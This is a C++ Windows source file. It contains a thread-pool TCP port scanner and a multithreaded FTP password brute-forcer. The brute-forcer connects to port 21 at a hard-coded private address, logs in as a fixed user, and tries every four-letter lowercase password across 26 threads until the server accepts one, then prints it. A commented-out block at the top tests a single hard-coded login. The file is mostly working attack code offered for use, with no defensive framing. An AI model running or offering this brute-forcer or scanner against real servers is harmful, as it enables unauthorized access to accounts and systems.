#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>
#include <future>
#include <queue>
#include <functional>
#include <condition_variable>
#include <mutex>

#pragma comment(lib, "Ws2_32.lib")
std::mutex mtx;

#pragma region FTPServerConnection
//int main()
//{
//	//WSADATA ws;
//	//if (WSAStartup(MAKEWORD(2, 2), &ws) == SOCKET_ERROR)
//	//{
//	//	std::cerr << "WSA failed with error" << std::endl;
//	//}
//
//	//SOCKET clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//	//if (clientsocket == INVALID_SOCKET)
//	//{
//	//	std::cerr << "Socket failed with error" << std::endl;
//	//	WSACleanup();
//	//	return EXIT_FAILURE;
//	//} 
//
//	//struct sockaddr_in servAddr;
//	//servAddr.sin_family = AF_INET;
//	//servAddr.sin_port = htons(PORT);
//	//if (inet_pton(AF_INET, IP, &servAddr.sin_addr) <= 0)
//	//{
//	//	std::cerr << "Invalid Format" << std::endl;
//	//	closesocket(clientsocket);
//	//	WSACleanup();
//	//	return EXIT_FAILURE;
//	//}
//
//	//if (connect(clientsocket, (const sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
//	//{
//	//	std::cout << "Connect failed " << std::endl;
//	//	closesocket(clientsocket);
//	//	WSACleanup();
//	//	return EXIT_FAILURE;
//	//}
//	//else
//	//{
//	//	std::string user = "testFTP";
//	//	std::string pass = "12345";
//
//	//	std::cout << "Connected to Server Succesfull" << std::endl;
//	//	/*
//	//	* 500 Command not understood.   
//	//	* 530 User cannot log in. 
//	//	*/
//	//	char servBuff[255] = { 0, };
//	//	recv(clientsocket, servBuff, sizeof(servBuff), 0);
//
//	//	std::string clientBuff = "USER "+user+"\r\n";
//	//	send(clientsocket, clientBuff.c_str(), clientBuff.size(), 0);
//
//	//	memset(servBuff, 0, sizeof(servBuff));
//	//	recv(clientsocket, servBuff, sizeof(servBuff), 0);
//
//	//	clientBuff = "PASS "+pass+"\r\n";
//	//	send(clientsocket, clientBuff.c_str(), clientBuff.size(), 0);
//
//	//	memset(servBuff, 0, sizeof(servBuff));
//	//	recv(clientsocket, servBuff, sizeof(servBuff), 0);
//	//	
//	//	std::string end(servBuff);
//	//	if(end.find("230 User logged in") != std::string::npos)
//	//	{
//	//		std::cout << "Brute force success" << std::endl;
//	//	}
//	//	else
//	//	{
//	//		std::cout << "Try again" << std::endl;
//	//	}
//	//	
//	//}
//
//
//
//	//closesocket(clientsocket);
//	//WSACleanup();
//
//
//
//	return 0;
//}

#pragma endregion

#pragma region ScanPort using ThreadPool
using Func = std::function<void()>;

class concurrency_queue
{
private:
	std::queue<Func> q;
	std::mutex mtx;
	std::condition_variable cv;

	friend class thread_pool;
	explicit concurrency_queue() = default;
public:
	void Enqueue(Func func)
	{
		std::lock_guard<std::mutex> lck(mtx);

		q.push(func);

		cv.notify_one();
	}

	Func Dequeue()
	{
		std::unique_lock<std::mutex> uniq_lock(mtx);
		cv.wait(uniq_lock, [this] {return !q.empty(); });

		Func func = q.front();
		q.pop();

		return func;
	}

};

class thread_pool
{
private:
	concurrency_queue cq;
	std::vector<std::thread> threads;
	std::mutex stop_mutex;
	std::condition_variable cv_stop;
	bool stop_flag;
	int taskNum;

	void work()
	{
		while (!stop_flag)
		{
			auto task = cq.Dequeue();
			if (task)
			{
				{ 
					std::lock_guard<std::mutex> lock(stop_mutex);
					taskNum--;
				}

				task(); 
			}
			cv_stop.notify_all();
		}
	}

public:

	thread_pool() : stop_flag(false), taskNum(0)
	{
		for (int i = 0; i < std::thread::hardware_concurrency(); i++)
		{
			threads.push_back(std::thread(&thread_pool::work, this));
		}
	}

	~thread_pool()
	{
		{
			std::unique_lock<std::mutex> uniq_lock(stop_mutex);
			cv_stop.wait(uniq_lock, [this] {return taskNum == 0; });
		}
		stop_flag = true;

		for (int i = 0; i < threads.size(); i++)
		{
			cq.Enqueue([] {});
		}

		for (auto& vec : threads)
		{
			vec.join();
		}
	}

	void addTask(Func func)
	{
		taskNum++;
		cq.Enqueue(func);
	}

};

std::mutex print_mutex;
void ScanPort(const std::string& ip, const int port)
{
	SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (client == INVALID_SOCKET)
	{
		std::lock_guard<std::mutex> lck(print_mutex);
		std::cerr << "Socket failed" << std::endl;
		return;
	}

	struct sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(port);
	if (inet_pton(AF_INET, ip.c_str(), &servAddr.sin_addr) <= 0)
	{
		std::lock_guard<std::mutex> lck(print_mutex);
		std::cerr << "Invalid Format" << std::endl;
		closesocket(client);
		return;
	}

	if (connect(client, (const sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
	{
		std::lock_guard<std::mutex> lck(print_mutex);
		std::cerr << "Ip: " << ip << " dont open port: " << port << std::endl;
		closesocket(client);
		return;
	}
	else
	{
		std::lock_guard<std::mutex> lck(print_mutex);
		std::cerr << "Ip: " << ip << " open port: " << port << std::endl;
		closesocket(client);
		return;
	}

}

#pragma endregion 

std::string charset = "qwertzuiopasdfghjklyxcvbnm";
int passCount = 4;
std::atomic<bool> stop_flag(false);

std::string BruteForceRunning(int start, int end)
{
	int size = charset.size();
	std::string checkpass(4, ' ');
	char buffer[256]{ "\0" };

	SOCKET client = socket(AF_INET, SOCK_STREAM, 0);
	sockaddr_in serverAddr{};
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(21);
	inet_pton(AF_INET, "172.16.40.179", &serverAddr.sin_addr);

	if (connect(client, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
		return " ";

	for (int i = start; i < end && !stop_flag.load(); i++)
	{
		int num = i;
		for (int j = 0; j < passCount; j++)
		{
			checkpass[j] = charset[num % size];
			num /= size;
		}

		std::string userCmd = "USER ntluan\r\n";
		send(client, userCmd.c_str(), userCmd.size(), 0);
		memset(buffer, 0, sizeof(buffer));
		recv(client, buffer, sizeof(buffer), 0);

		std::string passCmd = "PASS " + checkpass + "\r\n";
		send(client, passCmd.c_str(), passCmd.size(), 0);
		memset(buffer, 0, sizeof(buffer));
		std::this_thread::sleep_for(std::chrono::microseconds(50));
		recv(client, buffer, sizeof(buffer), 0);

		std::string response = buffer;
		if (response.rfind("230", 0) != std::string::npos)
		{
			std::cout << checkpass << std::endl;
			stop_flag = true;
			closesocket(client);
			return checkpass;
		}
	}

	closesocket(client);
	return " ";
}

std::string BruteForce()
{
	int total = std::pow(charset.size(), passCount); // 456.976

	int threadsCount = 26;
	int chunkSize = total / threadsCount;

	std::vector<std::future<std::string>> threads;
	for (int i = 0; i < threadsCount; ++i)
	{
		int start = i * chunkSize;
		int end = (i == threadsCount - 1) ? total : start + chunkSize;
		threads.push_back(std::async(std::launch::async, BruteForceRunning, start, end));
	}

	for (auto& t : threads)
	{
		std::string result = t.get();
		if (result != " ")
			return result;
	}

	return " ";
}
int main()
{
	auto start = std::chrono::high_resolution_clock::now();
	WSADATA ws;
	if (WSAStartup(MAKEWORD(2, 2), &ws) == SOCKET_ERROR)
	{
		std::cerr << "WSA failed with error" << std::endl;
		return EXIT_FAILURE;
	}
	std::string result = BruteForce();
	if (result != " ")
	{
		std::cout << "Password is " << result << std::endl;
	}
	else
	{
		std::cout << "Dont Found Password" << std::endl;
	}

	auto end = std::chrono::high_resolution_clock::now();
	std::cout << "Time: " << std::chrono::duration<double>(end - start).count() << std::endl;

	WSACleanup();

	return 0;
}